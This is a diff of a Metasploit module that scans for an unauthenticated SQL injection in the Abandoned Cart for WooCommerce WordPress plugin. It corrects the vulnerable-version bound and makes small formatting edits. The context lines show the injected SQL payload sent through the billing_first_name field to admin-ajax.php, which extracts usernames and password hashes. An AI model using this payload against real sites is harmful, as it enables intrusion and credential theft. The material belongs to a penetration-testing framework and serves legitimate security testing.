@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'Abandoned Cart for WooCommerce SQLi Scanner',
         'Description' => %q{
           Abandoned Cart, a plugin for WordPress which extends the WooCommerce plugin,
-          prior to 5.8.4 is affected by an unauthenticated SQL injection via the
+          prior to 5.8.2 is affected by an unauthenticated SQL injection via the
           billing_first_name parameter of the save_data AJAX call.  A valid
           wp_woocommerce_session cookie is required, which has at least one item in the
           cart.
@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
             ['URL', 'https://plugins.trac.wordpress.org/changeset/2413885']
           ],
         'Actions' => [
-          ['List Users', 'Description' => 'Queries username, password hash for COUNT users'],
+          ['List Users', 'Description' => 'Queries username, password hash for COUNT users']
         ],
         'DefaultAction' => 'List Users',
         'DisclosureDate' => '2020-11-05'
@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    checkcode = check_plugin_version_from_readme('woocommerce-abandoned-cart', '5.8.4')
+    checkcode = check_plugin_version_from_readme('woocommerce-abandoned-cart', '5.8.2')
     if checkcode == Msf::Exploit::CheckCode::Safe
       vprint_error('Abandoned Cart for WooCommerce version not vulnerable')
       return
@@ -85,7 +85,6 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi({
         'method' => 'POST',
         'cookie' => datastore['COOKIE'],
-        #'ctype' => 'application/x-www-form-urlencoded; charset=utf-8',
         'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
         'vars_post' => {
           'billing_first_name' => "#{Rex::Text.rand_text_alpha_lower(6)}','','','','',( TRUE AND #{payload})) -- #{Rex::Text.rand_text_alpha_lower(1)}",
